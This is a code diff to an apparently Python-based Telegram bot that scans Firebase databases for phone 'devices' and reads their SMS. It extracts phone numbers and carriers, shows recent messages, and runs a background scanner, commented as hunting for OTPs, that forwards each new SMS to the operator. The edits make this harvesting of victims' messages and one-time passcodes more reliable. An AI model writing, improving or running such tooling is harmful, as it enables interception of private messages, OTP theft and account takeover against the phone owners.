@@ -219,7 +219,7 @@ def get_online_devices():
         fb_url = fb_url.strip().rstrip('/')
         try:
             res = requests.get(f"{fb_url}/.json", timeout=10)
-            print(f"[FB DEBUG] {fb_url}/.json -> {res.status_code} | raw: {res.text[:300]}")
+            print(f"[FB DEBUG] {fb_url}/.json -> {res.status_code}")
             if res.status_code != 200 or not res.json():
                 continue
                 
@@ -231,8 +231,7 @@ def get_online_devices():
                     online_val = str(node.get('online', '')).lower()
                     is_online = status_val in ['online', 'active', '1', 'true', 'connected'] or online_val in ['true', '1', 'online']
                     
-                    # Trigger scan if it looks like a device node
-                    if is_online and any(k in node for k in ['number', 'phone', 'battery', 'sms', 'device_id', 'model', 'sim', 'messages', 'inbox', 'sim1', 'sim2']):
+                    if is_online and any(k in node for k in ['number', 'phone', 'battery', 'sms', 'device_id', 'model', 'sim', 'messages', 'inbox', 'sim1', 'sim2', 'phoneNumber']):
                         dev_id = current_path.split('/')[-1] or node.get('device_id', node.get('id', 'Unknown'))
                         if dev_id not in db_data.get('active_monitors', {}):
                             if not any(d['device_id'] == dev_id for d in all_devices):
@@ -240,40 +239,38 @@ def get_online_devices():
                                 net = 'N/A'
                                 
                                 # 1. Direct & Flat Keys for Number
-                                num_keys = ['number', 'phone', 'mobile', 'msisdn', 'phoneNumber', 'phone_no', 'phone_number', 'sim_number', 'sim1', 'sim2', 'msisdn1', 'msisdn2', 'contact', 'sim1_number', 'sim2_number']
+                                num_keys = ['phoneNumber', 'Phone Number', 'phone_number', 'number', 'phone', 'mobile', 'msisdn', 'phone_no', 'sim_number', 'sim1', 'sim2', 'msisdn1', 'msisdn2', 'sim1_number', 'sim2_number']
                                 for k in num_keys:
-                                    if k in node and isinstance(node[k], (str, int)) and str(node[k]).strip():
-                                        num = str(node[k]).strip()
-                                        break
+                                    if k in node and isinstance(node[k], (str, int)):
+                                        val = str(node[k]).strip()
+                                        # fixed: removed regex fallback that was pulling random numbers from SMS, strict 10-15 digit check
+                                        if val and val != '0' and re.search(r'\d{10,15}', val):
+                                            num = val
+                                            break
                                 
-                                # 2. Nested SIM objects for Number (e.g., sim1: {number: "..."})
+                                # 2. Nested SIM objects for Number
                                 if num == 'Unknown':
                                     for k in ['sim1', 'sim2', 'sim', 'simInfo', 'sim_info', 'sim_info_1', 'sim_info_2']:
                                         if k in node and isinstance(node[k], dict):
-                                            for subk in num_keys:
-                                                if subk in node[k] and isinstance(node[k][subk], (str, int)) and str(node[k][subk]).strip():
-                                                    num = str(node[k][subk]).strip()
-                                                    break
+                                            for subk in ['phoneNumber', 'Phone Number', 'number', 'phone', 'mobile', 'msisdn']:
+                                                if subk in node[k] and isinstance(node[k][subk], (str, int)):
+                                                    val = str(node[k][subk]).strip()
+                                                    if val and re.search(r'\d{10,15}', val):
+                                                        num = val
+                                                        break
                                         if num != 'Unknown': break
-                                        
-                                # 3. Regex Fallback (search for any 10-15 digit number in the whole device node)
-                                if num == 'Unknown':
-                                    node_str = json.dumps(node)
-                                    match = re.search(r'\+?\d{10,15}', node_str)
-                                    if match:
-                                        num = match.group(0)
                                 
-                                # 4. Network Extraction
-                                net_keys = ['network', 'operator', 'carrier', 'network_type', 'net_type', 'sim_operator', 'provider', 'operator_name']
+                                # 3. Network Extraction
+                                net_keys = ['Network', 'network', 'operator', 'carrier', 'network_type', 'net_type', 'sim_operator', 'provider', 'operator_name']
                                 for k in net_keys:
-                                    if k in node and isinstance(node[k], str) and node[k].strip():
+                                    if k in node and isinstance(node[k], str) and node[k].strip() and node[k].strip().lower() not in ['null', 'n/a', 'unknown']:
                                         net = node[k].strip()
                                         break
                                 if net == 'N/A':
                                     for k in ['sim1', 'sim2', 'sim', 'simInfo', 'sim_info']:
                                         if k in node and isinstance(node[k], dict):
                                             for subk in net_keys:
-                                                if subk in node[k] and isinstance(node[k][subk], str) and node[k][subk].strip():
+                                                if subk in node[k] and isinstance(node[k][subk], str) and node[k][subk].strip() and node[k][subk].strip().lower() not in ['null', 'n/a', 'unknown']:
                                                     net = node[k][subk].strip()
                                                     break
                                         if net != 'N/A': break
@@ -394,13 +391,17 @@ def view_sms_handler(call):
         if res.status_code == 200 and res.json():
             dev_info = res.json()
             sms_list = []
-            for key in ['sms', 'messages', 'inbox', 'last_sms', 'data', 'text']:
+            for key in ['sms', 'SMS', 'messages', 'inbox', 'last_sms', 'data', 'text']:
                 if key in dev_info and dev_info[key]:
                     raw_sms = dev_info[key]
                     if isinstance(raw_sms, list):
                         sms_list = raw_sms
                     elif isinstance(raw_sms, dict):
-                        sms_list = list(raw_sms.values())
+                        # fixed: ensure dict of dicts is parsed correctly
+                        if 'message' in raw_sms or 'text' in raw_sms:
+                            sms_list = [raw_sms]
+                        else:
+                            sms_list = list(raw_sms.values())
                     elif isinstance(raw_sms, str):
                         sms_list = [{"message": raw_sms, "sender": "Unknown"}]
                     break
@@ -413,8 +414,8 @@ def view_sms_handler(call):
             text = f"📩 <b>Last {len(last_5)} SMS for <code>{active_dev}</code></b>\n\n"
             for i, sms in enumerate(last_5):
                 if isinstance(sms, dict):
-                    msg_body = sms.get('message', sms.get('text', str(sms)))
-                    sndr = sms.get('sender', sms.get('from', 'Unknown'))
+                    msg_body = sms.get('message', sms.get('text', sms.get('body', str(sms))))
+                    sndr = sms.get('sender', sms.get('from', sms.get('address', 'Unknown')))
                 else:
                     msg_body = str(sms)
                     sndr = 'Unknown'
@@ -450,6 +451,7 @@ def back_to_main_handler(call):
     show_main_menu(call.message.chat.id, call.from_user.id)
 
 # ==========================================
+# ==========================================
 # 🔄 BACKGROUND SCANNER (OTP DHOONDHNA & 10 MIN TIMER)
 # ==========================================
 def background_scanner():
@@ -477,7 +479,6 @@ def background_scanner():
                         except:
                             pass
 
-            # fixed: scan only active monitored devices directly using their paths
             for dev_id, monitor in list(db_data['active_monitors'].items()):
                 fb_url = monitor.get('fb_url')
                 dev_path = monitor.get('path')
@@ -490,30 +491,47 @@ def background_scanner():
                     res = requests.get(f"{fb_url}/{dev_path}.json", timeout=5)
                     if res.status_code == 200:
                         dev_info = res.json()
-                        if dev_info:
+                        if dev_info and isinstance(dev_info, dict):
                             sms_text = None
                             sender = "Unknown"
                             
-                            if isinstance(dev_info, dict):
-                                for key in ['sms', 'messages', 'inbox', 'last_sms', 'data', 'text']:
-                                    if key in dev_info and dev_info[key]:
-                                        if isinstance(dev_info[key], list) and len(dev_info[key]) > 0:
-                                            latest_sms = dev_info[key][-1]
-                                            sms_text = latest_sms.get('message', latest_sms.get('text', str(latest_sms)))
-                                            sender = latest_sms.get('sender', latest_sms.get('from', 'Unknown'))
-                                        elif isinstance(dev_info[key], dict):
-                                            sms_text = dev_info[key].get('message', dev_info[key].get('text', ''))
-                                            sender = dev_info[key].get('sender', dev_info[key].get('from', 'Unknown'))
-                                        elif isinstance(dev_info[key], str):
-                                            sms_text = dev_info[key]
+                            # fixed: strict extraction of latest SMS from lists, dicts, or direct strings
+                            for key in ['sms', 'SMS', 'messages', 'inbox', 'last_sms', 'data', 'text']:
+                                if key in dev_info and dev_info[key]:
+                                    raw = dev_info[key]
+                                    latest = None
+                                    
+                                    if isinstance(raw, list) and len(raw) > 0:
+                                        latest = raw[-1]
+                                    elif isinstance(raw, dict):
+                                        if 'message' in raw or 'text' in raw or 'body' in raw:
+                                            latest = raw
+                                        else:
+                                            # Firebase dict values are chronological, get last inserted
+                                            vals = list(raw.values())
+                                            if vals: latest = vals[-1]
+                                    elif isinstance(raw, str):
+                                        latest = raw
                                         
-                                        if sms_text: break
+                                    if isinstance(latest, dict):
+                                        sms_text = latest.get('message', latest.get('text', latest.get('body', str(latest))))
+                                        sender = latest.get('sender', latest.get('from', latest.get('address', 'Unknown')))
+                                    elif isinstance(latest, str):
+                                        sms_text = latest
+                                        sender = "Unknown"
+                                        
+                                    if sms_text: break
                             
                             if sms_text:
-                                msg_hash = f"{dev_id}_{hash(sms_text)}"
+                                # fixed: use string itself for hash instead of python hash() which randomizes
+                                msg_hash = f"{dev_id}_{sender}_{sms_text}"
                                 
                                 if msg_hash not in sent_messages:
                                     sent_messages.add(msg_hash)
+                                    
+                                    # Memory leak se bachne ke liye set ko trim karo
+                                    if len(sent_messages) > 1000:
+                                        sent_messages.clear()
                                     
                                     time_str = datetime.datetime.now().strftime("%d-%m-%Y • %I:%M %p")
                                     final_msg = format_sms_message(sender, sms_text, time_str)
